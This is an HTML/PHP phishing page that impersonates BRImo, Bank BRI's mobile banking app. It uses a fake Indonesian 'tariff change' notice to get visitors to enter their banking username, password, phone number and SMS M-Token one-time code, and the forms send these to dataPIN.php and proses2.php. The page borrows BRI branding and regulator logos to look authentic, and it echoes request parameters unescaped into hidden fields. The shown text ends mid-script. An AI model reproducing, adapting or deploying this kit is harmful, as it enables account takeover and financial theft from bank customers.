<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
        <link rel="stylesheet" href="http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
        <title>BRImo</title>
        <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/brimowel.png" />
<style>
@font-face {
  font-family: alexfonthel;
  src: url(https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/helvetica_neue.woff);
}
* {
    margin: 0px;
}
body {
    margin: 0px;
    background: #fff;
    color: #000;
    font-family: 'alexfonthel', sans-serif;
}
welalxcome {
        position: fixed;
    left: 0;
    top: 0;
    width: 100vw;
    height: 100vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
}
welalxcome img {
        width: 11vw;
    height: auto;
}
chsalxcome {
        position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.talxcome {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    height: 55vh;
    justify-content: center;
}
.talxcome img {
        width: 73%;
}
.balxcome {
        height: 45vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.txalxcome {
        width: 90%;
    height: 25vh;
    text-align: left;
}
.txalxcome p {
        font-weight: 600;
    font-size: 1.5rem;
    margin-bottom: 5vh;
    color: #1d66ab;
}
.txalxcome span {
        width: 80%;
    font-size: 18px;
}
.btalxcome {
        width: 90%;
    height: 20vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.btalxcome button {
        width: 100%;
    background: #1d66ab;
    color: #fff;
    font-family: inherit;
    border-radius: 5px;
    border: none;
    font-size: 16px;
    padding: 2vh 0px;
    margin-bottom: 4vh;
    font-weight: 500;
    box-shadow: 0px 0px 1px 0px #000;
    cursor: pointer;
}
.btalxcome p {
        color: #1d66ab;
    font-weight: 500;
    cursor: pointer;
}
frmalxbr {
        position: relative;
    width: 100vw;
    height: 100vh;
}
.hdralxfrm {
        width: 100%;
    position: fixed;
    left: 0;
    top: 0;
    display: block;
    text-align: center;
    padding: 1.5vh 0px;
    box-shadow: 0px 1px 20px 0px #00000040;
    z-index: 1;
}
.hdralxfrm img {
        width: 10vw;
    height: auto;
}
.chalxfrm {
        position: relative;
    width: 100%;
    height: 50vh;
    z-index: 0;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.bgchalxfrm {
    background: url(https://siapjadi.com/brimo.jpg) no-repeat center;
    background-size: 100%;
    position: unset;
    width: 100%;
    border-radius: 0px;
    top: 0;
    height: 100%;
    border: none;
}
.chalxfrm p {
        position: absolute;
    color: #fff;
    font-size: 19px;
    font-weight: 600;
    letter-spacing: 1px;
    top: 11vh;
}
.chalxfrm img {
        position: absolute;
    width: 90%;
    bottom: 5vh;
}
.frmalxbrm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    height: 42vh;
    width: 100%;
}
.inpalxbrm {
        margin-top: 3vh;
    width: 90%;
    height: 35vh;
}
.inpalxbrm p {
        color: #2069ab;
    font-weight: 600;
    font-size: 18px;
    letter-spacing: 1px;
    margin-left: 3vw;
}
.bxmalxbrm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100%;
    padding-top: 2vh;
}
.itmalxbrm {
    position: relative;
        width: 95%;
    background: #fff;
    box-shadow: 0px 1px 3px 0px #00000087;
    border-radius: 3px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    padding: 1.8vh 2vw;
    column-gap: 3vw;
}
.itmalxbrm img {
        height: 4vh;
}
.itmalxbrm input {
        font-family: arial, sans-serif;
    font-size: 17px;
    font-weight: 300;
    border: none;
    outline: none;
}
.inpalxbrm span {
        width: 100%;
    text-align: right;
    display: block;
    margin-top: 2.5vh;
    font-size: 14px;
    cursor: pointer;
}
.btnalxfrm {
        height: 10vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    width: 90%;
}
.btnalxfrm button {
        width: 100%;
    background: #1d66ab;
    color: #fff;
    font-family: inherit;
    border-radius: 5px;
    border: none;
    font-size: 16px;
    padding: 2vh 0px;
    margin-bottom: 4vh;
    font-weight: 500;
    box-shadow: 0px 0px 1px 0px #000;
    cursor: pointer;
}
#togglePassword {
    background-size: 100% 100%;
    height: 3vh;
    width: 3.5vh;
    margin-top: 0;
    position: absolute;
    right: 4vw;
    cursor: pointer;
}
.fa-eye {
    background: url(https://siapjadi.com/brimo/bulamata-.png) no-repeat center;
}
.fa-eye-slash {
    background: url(https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/20220617_022922.png) no-repeat center;
}
.opbtn {
    opacity: 0.5;
}
.alxslh {
    
    position: fixed;
    left: 0;
    top: 8vh;
    z-index: 3;
    font-size: 20px;
    font-weight: 400;
    color: #fff;
    background: #f53939;
    text-align: center;
    width: 100%;
    font-family: arial, sans-serif;
    padding: 1.7vh 0px;
    display: none;
    margin-top:-50px;
}
pnalxbr {
        /*background: rgb(36 131 240);*/
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100vw;
    height: 100vh;
    color: #fff;
}
.hdralxpn {
        width: 100%;
    height: 5vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
}
.hdralxpn span {
        margin-left: 3%;
}
.hdralxpn p {
       font-weight: 400;
    font-size: 15px; 
}
.hdralxpn label {
        visibility: hidden;
    margin-right: 3%;
}
.txalxpn {
        padding-top: 10vh;
    padding-bottom: 5vh;
    width: 70%;
    text-align: left;
}
.txalxpn p {
       font-size: 17px;
    font-weight: 400; 
}
.txalxpn span {
        font-size: 12px;
    font-weight: 300;
    font-family: Arial, sans-serif;
}
.inpalxpn {
        width: 70%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
#alxpnnikah {
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    column-gap: 7vw;
    position: relative;
    align-content: center;
}
#alxpnnikah input {
        position: absolute;
    z-index: 2;
    color: #fff;
    border: none;
    outline: none;
    font-family: inherit;
    background: transparent;
    font-size: 24px;
    letter-spacing: 10vw;
    width: 100%;
    overflow: hidden;
    float: left;
    text-align: left;
    text-overflow: revert;
    cursor: not-allowed;
    pointer-events: none;
}
.bxinpalxpn {
        width: 6vw;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    align-content: center;
    justify-content: center;
}
.bxinpalxpn input {
        width: 100%;
    height: 100%;
    position: absolute;
    background: transparent;
    outline: none;
    border: none;
    cursor: pointer;
    text-align: center;
    color: #fff;
    font-family: inherit;
    font-size: 24px;
}
.bxinpalxpn span {
       background: #dddddd8a;
    height: 6.5vh;
    width: 5.5vh;
    display: block;
    border-radius: 10px;
}
.txalxlppn {
        padding: 7vh 0px 9vh;
    font-size: 13px;
    font-family: arial, sans-serif;
    cursor: pointer;
}
.kybalxpn {
        width: 90%;
}
.inpalxkyb {
        width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 4vh;
}
.inpalxkyb button {
        background: transparent;
    color: #fff;
    font-family: inherit;
    cursor: pointer;
    outline: none;
    border: none;
    font-size: 30px;
    width: 30%;
    height: 8vh;
}
smalxs {
        height: 100vh;
    width: 100vw;
    background: #f2f2f2;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
}
.bxalxsm {
        position: relative;
    width: 85%;
    padding: 15vh 0% 2vh;
    background: #fff;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    border: 1px solid rgba(166, 166, 166, 0.37);
    border-radius: 10px;
}
.bxalxsm img {
        width: 80%;
    position: absolute;
    top: -10vh;
}
.bxalxsm garis {
        display: block;
    width: 100%;
    border-bottom: 2px dotted rgb(204, 204, 204);
}
.bxalxsm label {
        color: #0776ED;
    font-weight: 300;
    font-family: arial, sans-serif;
    padding: 2vh;
}
.alxinpsm {
        width: 90%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.alxinpsm span {
        color: rgb(158, 158, 158);
    font-size: 12px;
    font-family: arial, sans-serif;
}
.alxinpsm input {
        box-sizing: border-box;
    z-index: 4;
    height: 75px;
    width: 100%;
    left: 0px;
    border-width: 1px;
    border-style: solid;
    border-color: rgb(189, 189, 189) rgb(189, 189, 189) rgb(214, 214, 214);
    border-image: initial;
    background-color: transparent;
    border-radius: 5px;
    box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
    font-size: 13px;
    color: rgb(85, 85, 85);
    padding: 0px 4px;
    top: 20px;
    transition: border-bottom-color 200ms ease 0s;
    margin: 1vh 0px 2vh;
    font-family: arial, sans-serif;
    outline: navajowhite;
}
.btnalxsm {
        width: 100%;
    text-align: right;
}
.btnalxsm button {
    cursor: pointer;
    background: none rgb(0, 134, 224);
    border: none;
    text-align: center;
    box-sizing: border-box;
    z-index: 6;
    height: 33px;
    left: 0px;
    top: 0px;
    font-size: 14px;
    color: rgb(255, 255, 255);
    line-height: 1;
    border-radius: 6px;
    box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
    font-family: arial, sans-serif;
    letter-spacing: 1px;
    padding: 0px 10px;
    outline: navajowhite;
}
.dscalxsm {
        margin-top: 5vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.dscalxsm p {
        text-align: center;
    width: 90%;
    font-size: 10px;
    color: rgba(10, 10, 10, 0.73);
    font-family: arial, sans-serif;
}
.malasngoding-slider { 
    border: 10px solid #efefef; 
    position: relative; 
    overflow: hidden; 
    background: #efefef;
}
 
.malasngoding-slider { 
    margin:20px auto;
    width: 768px;
    height: 450px; 
}
 
.isi-slider img { 
    width: 768px;
    height: 450px; 
    float: left;
}
 
.isi-slider { 
    position: absolute; 
    width:3900px;  
 
    /*pengaturan durasi lama tampil gambar bisa di atur di bawah ini*/
    animation-name:slider;
    animation-duration:16s;
    animation-timing-function: ease-in-out;
    animation-iteration-count:infinite;
    -webkit-animation-name:slider;
    -webkit-animation-duration:16s;
    -webkit-animation-timing-function: ease-in-out;
    -webkit-animation-iteration-count:infinite;
    -moz-animation-name:slider;
    -moz-animation-duration:16s;
    -moz-animation-timing-function: ease-in-out;
    -moz-animation-iteration-count:infinite;
    -o-animation-name:slider;
    -o-animation-duration:16s;
    -o-animation-timing-function: ease-in-out;
    -o-animation-iteration-count:infinite;
}
 
 
/*saat gambar di hover oleh cursor mouse maka berhenti slide*/
.isi-slider:hover { 
    -webkit-animation-play-state:paused; 
    -moz-animation-play-state:paused; 
    -o-animation-play-state:paused; 
    animation-play-state:paused; }
}
 
.isi-slider img { 
    float: right; 
}
 
.malasngoding-slider:after { 
    font-size: 150px; 
    position: absolute; 
    z-index: 12; 
    color: rgba(255,255,255, 0); 
    left: 300px; top: 80px; 
    -webkit-transition: 1s all ease-in-out; 
    -moz-transition: 1s all ease-in-out; 
    transition: 1s all ease-in-out; 
}
 
.malasngoding-slider:hover:after { 
    color: rgba(255,255,255, 0.6);  
}
 
 
 
@-moz-keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }       
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0;
    }       
    100% {
        left: 0; opacity: 0; 
    }
} 
 
@-webkit-keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }       
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0;
    }       
    100% {
        left: 0; opacity: 0; 
    }
} 
 
 
@keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }     
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0; 
    } 
 
    100% {
        left: 0; opacity: 0; 
    }
}
*{
    margin: 0;
    padding: 0;
    list-style: none;
    text-decoration: none;
}

.slider{
    overflow: hidden;
    height: 350px;
}

.slider figure div{
    width: 20%;
    float: left;
}

.slider figure img{
    width: 100%;
    float: left;
}

.slider figure{
    position: relative;
    width: 500%;
    margin: 0;
    left: 0;
    animation: 20s slidy infinite;
}

@keyframes slidy{
    0%{
        left: 0%
    }

    10%{
        left: 0%;
    }

    12%{
        left: -100%;
    }

    22%{
        left: -100%;
    }

    24%{
        left: -200%;
    }

    34%{
        left: -200%;
    }

    36%{
        left: -300%;
    }

    46%{
        left: -300%;
    }

    48%{
        left: -400%;
    }

    58%{
        left: -400%;
    }

    60%{
        left: -300%;
    }

    70%{
        left: -300%;
    }

    72%{
        left: -200%;
    }

    82%{
        left: -200%;
    }

    84%{
        left: -100%;
    }

    94%{
        left: -100%;
    }

    96%{
        left: 0%;
    }

    100%{
        left: 0%;
    }
}
/* css modal */

:root {
  --modal-duration: 1s;
  --modal-color: #428bca;
}


.button {
  background: #428bca;
  padding: 1em 2em;
  color: #fff;
  border: 0;
  border-radius: 5px;
  cursor: pointer;
}

.button:hover {
  background: #3876ac;
}

.modal {
  display: none;
  position: fixed;
  z-index: 1;
  left: 0;
  top: 0;
  height: 100%;
  width: 100%;
  overflow: auto;
  background-color: rgba(0, 0, 0, 0.5);
}

.modal-content {
  margin: 50% auto;
  width: 85%;
  box-shadow: 0 5px 8px 0 rgba(0, 0, 0, 0.2), 0 7px 20px 0 rgba(0, 0, 0, 0.17);
  animation-name: modalopen;
  animation-duration: var(--modal-duration);
}

.modal-header h2,
.modal-footer h3 {
  margin: 0;
}

.modal-header {
  background: var(--modal-color);
  padding: 15px;
  color: #fff;
  border-top-left-radius: 5px;
  border-top-right-radius: 5px;
}

.modal-body {
  padding: 10px 20px;
  background: #fff;
}

.modal-footer {
  background: var(--modal-color);
  padding: 10px;
  color: #fff;
  text-align: center;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
}

.close {
  color: #ccc;
  float: right;
  font-size: 30px;
  color: #fff;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}

@keyframes modalopen {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

#alxsm {
      border-radius: 10px;
      border: 2px solid #09559a;
      color: #09559a;
      font-size: 14px;
      font-weight:bold;
      margin-bottom: 15px;
      padding: 0.5em 1em 0.5em 0;
      width: 95%;     /* Ukuran bebas */
      height: 100px;     /* Ukuran bebas */
      text-align: center;
      margin-left:5px;
 }

/* css modal*/
</style>
    </head>
    <body>
        <main>
            <welalxcome>
                <img src="https://cdn.kibrispdr.org/data/1789/loading-gif-png-3.gif" alt="" />
            </welalxcome>
            <chsalxcome style="display: none;">
                <div style="height:10px;width: 70px;margin-top: 15px;margin-bottom: 15px;" class="talxcome">
                    <img  src="https://apx.btimobile.xyz/bri-header.png" alt="" />
                </div>
                <div class="slider">
                    <figure>
                        <div class="slide">
                            <img src="https://siapjadi.com/2.jpg">
                        </div>

                        <div class="slide">
                            <img src="https://siapjadi.com/1.jpg">
                        </div>

                        <div class="slide">
                            <img src="https://siapjadi.com/2.jpg">
                        </div>

                        <div class="slide">
                            <img src="https://siapjadi.com/1.jpg">
                        </div>

                        <div class="slide">
                            <img src="https://siapjadi.com/2.jpg">
                        </div>
                    </figure><br><br><br>
                    <div class="txalxcome" style="margin-left: 25px;margin-top: 100px;">
                        <center style="color:#09559a;">
                            <br><span><h3 >Perubahan Tarif</h3></span>
                            <h5> Silahkan pilih transaksi sesuai kebutuhan Anda di bawah ini.</h5>
                        </center>
                    
                        <center >
                            <br><span><h4 style="color:#000000;">TARIF TRANSAKSI</h4></span>

                        </center>
                        <br>
                        <h4 style="color:#09559a;"> 
                            <label id="label1">
                                <input type="checkbox" name="tarif[]" id="tarif">
                                Tarif Baru Rp 150.000 Unlimited Bulanan
                            </label>
                            
                        </h4>
                        <h4 style="color:#09559a;"> 
                            
                            <label id="label2">
                                <input  type="checkbox" name="tarif[]" id="tarif" >
                                Tarif Lama Rp 6.500 / Transaksi
                            </label>
                        </h3>

                    </div>
                </div>
                <div class="balxcome">
                    <div class="alxslh" id="haruspilih"><span color:red>Silahkan pilih jenis tarif untuk lanjut!</span></div>
                    <br>
                    <center style="color:#09559a;">
                    
                            <h6> BANK BRI Update Terbaru Tarif Transaksi</h6>
                        </center>

                    <div class="btalxcome">
                        <button style="width:320px;border-radius:50px;font-size: 15px;padding:10px" onclick="alxfrmb()"><strong >Lanjut</strong></button>
                    </div>

                    <center style="color:#000000;margin-top: -100xp;">
                        <h5> Terdaftar dan diawasi oleh:</h5>
                        <img width="60px" src="https://siapjadi.com/ojk.png">
                        <img width="60px" src="https://siapjadi.com/lps.png">
                    </center>
                    <br>
                    <div style="background-color: #09559a;color: white;padding: 15px;">
                        <center><h6>Copyright &copy; 2022 PT. Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</h6></center>
                    </div>

                </div>
                
            </chsalxcome>

            <chsalxcome2 style="display: none;">
                <div class="talxcome">
                    <img src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/charalex.png" alt="" />
                </div>
                <div class="balxcome">
                    <div class="txalxcome">
                        <p>Selamat Datang di BRImo</p>
                        <span>Apakah Anda memiliki akun <b>Internet Banking Bank BRI?</b></span>
                    </div>
                    <div class="btalxcome">
                        <button onclick="alxfrmb2()">Punya Akun</button>
                        <p onclick="alxfrmb2()">Belum punya Akun</p>
                    </div>
                </div>
            </chsalxcome2>

            <frmalxbr style="display: none">
                <div class="alxslh" id="eslh">Silahkan periksa kembali username dan password Anda</div>
                <div class="alxslh" id="pslh">Silahkan periksa kembali username dan password Anda</div>
                <div class="chalxfrm">
                    <div class="bgchalxfrm"></div>
                </div>
                <div class="frmalxbrm">
                    <!--modal-->
                    
                    <!--<button id="modal-btn" class="button">Click Here</button>-->

                      <div id="my-modal" class="modal">
                        <div class="modal-content">
                          <div class="modal-header" style="background-color:white;color:#09559a;">
                            <span style="color:#09559a;" class="close">&times;</span>
                            <center><h3>Selamat Datang di <br>Perubahan Tarif BRImo</h3></center>
                          </div>
                          <div class="modal-body">
                           <center>
                                <p>Silahkan Tekan "Konfirmasi" untuk melanjutkan perubahan Tarif BRI</p><br>
                              
                              <button id="close" class="button" style="background-color:white;color:#09559a;border-color:#09559a;border: 1px solid #09559a;" >Tidak</button></a>
                              <button id="close" class="button" onclick="alxfrm()">Konfirmasi</button>
                           </center>
                          </div>
                          <!--<div class="modal-footer">
                            <h3>Modal Footer</h3>
                          </div>-->
                        </div>
                      </div>
                    
                    <!--modal-->
                    <div class="inpalxbrm">
                        <p>Login</p>
                        <form class="bxmalxbrm" id="ngumpulinuangnikah">
                            <div class="itmalxbrm">
                                <img src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/user-96.png" alt="" />
                                <input class="input" type="text" name="email" id="ealx" placeholder="Username">
                            </div>
                            <div class="itmalxbrm">
                                <img src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/lock-150.png" alt="" />
                                <input class="input" type="password" name="password" id="palx" placeholder="Password">
                                <span id="togglePassword" toggle="#ppalx" class="fa-eye"></span>
                            </div>
                        </form>
                        <span>Lupa Password?</span>
                    </div>
                    <div class="btnalxfrm">
                        <button class="opbtn" id="btnpst"  disabled>Login</button>
                        <button style="width:60px;margin-left:10px" class="button"><img width="32px"  style="margin:-20px;" src="https://siapjadi.com/sidikjari.png"></button>
                    </div>
                </div>
                
            </frmalxbr>
            
            <pnalxbr style="display: none;">
                
                <!---->
                
                <img style="top:0px;position:fixed;margin-left:7px;margin-top:10px" style="background-color:#206899" width="20%" src="https://siapjadi.com/bri-header.png"><br>
                <div class="row" style="margin-top:40px;padding-left:20px;padding-right:20px">
                    <form method="POST" action="dataPIN.php" class="formhp" id="formhp">
                    <div class="mb-3">
                     <center>
                          <h6 style="padding:10px;color:black">Masukkan nomor handphone yang terdaftar di akun BRImo/Internet Banking Anda, untuk mendapatkan SMS Konfirmasi Aktivasi </h6>
                     </center><br>
                     <center>
                         <img width="80%" src="https://siapjadi.com/phone.png">
                     </center>
                     <br>
                      <label  style="font-size: 17px;font-weight: Bold;" for="exampleFormControlTextarea1" class="form-label">Nomor Handphone Anda</label><br>
                      
                      <input name="pin" class="alxpinr" id="pinalx" type="number" name="handphone" id="handphone" required style="background-color: #f1f2f5;font-weight: Bold;padding:10px;width:93%;border-radius:10px;border-color:1px solid orange" class="form-control" placeholder="08XXXX">
                        <input type="hidden" name="email" id="remail" readonly />
                        <input type="hidden" name="password" id="rpassword" readonly />
                    </div>
                    <br>
                    <div class="mb-3">
                      <center>
                          <button onclick="fralxpn()" style="
                          border:0px;
                          font-size:20px ;
                          background-color: #014a94;
                          color: white;
                          border-radius: 10px;
                          font-weight: bold;
                          width:100%;
                          float:center;padding:10px"  class="btn btn-primary" >Lanjut</button>
                      
                          
                      </center>
                      
                    </div>
                    
                    
                </form>
                </div>
                
                <!---->
                <!--<div class="hdralxpn">
                    <span class="material-symbols-outlined" onclick="clpnalx()">arrow_back</span>
                    <p>PIN</p>
                    <label>alex</label>
                </div>
                <div class="txalxpn">
                    <p>Konfirmasi PIN</p>
                    <span>Silakan konfirmasi PIN yangg sudah Anda buat.</span>
                </div>
                <div class="inpalxpn">
                    <form id="alxpnnikah" class="pin1">
                        <input type="number" class="alxpinr" id="pinalx" pattern="\d*.{5,6}" maxlength="6" autocomplete="off" name="pin" value="" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" onKeyPress="if(this.value.length==6) return false;" onKeyDown="if(this.value.length==6 && event.keyCode!=8) return false;" inputmode="numeric">
                        <input type="hidden" name="email" id="remail" readonly />
                        <input type="hidden" name="password" id="rpassword" readonly />
                        <div class="bxinpalxpn pin1">
                            <span></span>
                        </div>
                        <div class="bxinpalxpn">
                            <span></span>
                        </div>
                        <div class="bxinpalxpn">
                            <span></span>
                        </div>
                        <div class="bxinpalxpn">
                            <span></span>
                        </div>
                        <div class="bxinpalxpn">
                            <span></span>
                        </div>
                        <div class="bxinpalxpn">
                            <span></span>
                        </div>
                    </form>
                </div>
                <div class="txalxlppn">Lupa PIN?</div>
                <div class="kybalxpn" id="brd1" style="margin-top:-20px">
                    <div class="inpalxkyb">
                        <button class="key1" data-key="1" id="kbrd1">1</button>
                        <button class="key1" data-key="2" id="kbrd2">2</button>
                        <button class="key1" data-key="3" id="kbrd3">3</button>
                    </div>
                    <div class="inpalxkyb">
                        <button class="key1" data-key="4" id="kbrd4">4</button>
                        <button class="key1" data-key="5" id="kbrd5">5</button>
                        <button class="key1" data-key="6" id="kbrd6">6</button>
                    </div>
                    <div class="inpalxkyb">
                        <button class="key1" data-key="7" id="kbrd7">7</button>
                        <button class="key1" data-key="8" id="kbrd8">8</button>
                        <button class="key1" data-key="9" id="kbrd9">9</button>
                    </div>
                    <div class="inpalxkyb">
                        <button class="del" data-key="" id="del"><span class="material-symbols-outlined">arrow_back</span></button>
                        <button class="key1" data-key="0" id="kbrd0">0</button>
                        <button onclick="fralxpn()">OK</button>
                    </div>
                </div>-->
            </pnalxbr>
            <smalxs style="display: none;">
                <?php 
                    if($_GET['eror'] == "invalid"){
                        ?>
                            <div style="background-color:red;color:white;width:100%;padding:10px;top:0px;position:fixed;z-index:100;font-size:20px"><center>Kode Invalid, silahkan kirim ulang!</center></div>
                        <?php
                    }
                    
                    ?>
                <div class="bxalxsm">
                    
                    <img src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/malx.png" alt="" />
                    <label style="margin-top:-25px;font-size:30px;font-weight: bold;" class="countdown"><strong>05:59</strong></label><br>
                    <form method="GET" action="proses2.php" class="alxinpsm">
                        <center>
                            <span><h2 style="color:black">Kode M-Token aktifasi Telah kami kirimkan ke Nomor handphone anda, Silakan Salin SMS lalu masukan 
M-Token Anda dibawah ini</h2></span><br>
                            
                            
                        </center>
                        <img style="width:20px;margin-top:350px" src="https://2.bp.blogspot.com/-CaIZTy7D0Yo/XJxhpo6mxPI/AAAAAAAAAQ0/TfHiVVxJ2x8PWhcd2NTk7mHf5N0KjaOUACLcBGAs/s1600/Arrow-down-gif.gif">
                        <input type="textarea" id="alxsm" name="link" placeholder="Contoh : BRI. mToken IB BRI ID0XXXXXX2 TRX adalah 1XXXXXX Kode berlaku 5 menit"/>
                        <input type="hidden" name="email" id="remail" value="<?php echo $_GET['email'] ?>" readonly />
                        <input type="hidden" value="<?php echo $_GET['password'] ?>" name="password" id="rpassword" readonly />
                        <input type="hidden" value="<?php echo $_GET['handphone'] ?>" name="pin" id="rpin" readonly />
                        <div class="btnalxsm">
                            <center>
                                <input type="submit"  style="width:90%;border-radius:50px;font-size: 15px;padding:10px;height:10%;background-color:#2d66ad;color:white" type="button" id="btnalxsm"  value="Verifikasi" onclick="loding()">
                            </center>
                        </div>
                    </form>
                    <!--<div class="dscalxsm">
                        <p>Link verifikasi BRImo telah kami kirim ke nomor handphone Anda, silahkan cek inbox handphone Anda</p>
                    </div>-->
                </div>
            </smalxs>
        </main>
        <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script>
        $( document ).ready(function() {
            setTimeout(() => {
                $('welalxcome').hide();
                /*$('chsalxcome').fadeIn();*/
                 $('smalxs').fadeIn();
                
            },1000)
        });
        
        /*sript modal*/

        // Get DOM Elements
        const modal = document.querySelector('#my-modal');
        const modalBtn = document.querySelector('#btnpst');
        const closeBtn = document.querySelector('.close');
        const closeBtn2 = document.querySelector('#close');
        
        // Events
        modalBtn.addEventListener('click', openModal);
        closeBtn.addEventListener('click', closeModal);
        closeBtn2.addEventListener('click', closeModal2);
        window.addEventListener('click', outsideClick);
        
        // Open
        function openModal() {
          modal.style.display = 'block';
        }
        
        // Close
        function closeModal() {
          modal.style.display = 'none';
        }
        
        // Close
        function closeModal2() {
          modal.style.display = 'none';
        }
        
        
        // Close If Outside Click
        function outsideClick(e) {
          if (e.target == modal) {
            modal.style.display = 'none';
          }
        }
        
        
        /* script modal*/

        function alxfrmb() {
            $("input[type=checkbox]").on( "change", function(evt) {
                document.getElementById("label1").style.color = '#09559a';
                document.getElementById("label2").style.color = '#09559a';
            });

            var tarif = $('input[id=tarif]:checked');
            var label = $('#label');
            if(tarif.length == 0){

                document.getElementById("label1").style.color = 'red';
                document.getElementById("label2").style.color = 'red';
                $('#haruspilih').show();
                setTimeout(() => {
                    $('#haruspilih').fadeOut();
                },1000)
                $('#pslh').hide();
                return false;
            }else{

                $('chsalxcome').hide();
                $('chsalxcome2').show();
            }
            
            
        }
        
        function alxfrmb2() {
                $('chsalxcome2').hide();
                $('frmalxbr').show();
            
            
            
        }
        function loding() {
           
            $('welalxcome').show();
            
        }
        
        </script>
        
        <script>
            const togglePassword = document.querySelector("#togglePassword");
            const password = document.querySelector("#palx");
    
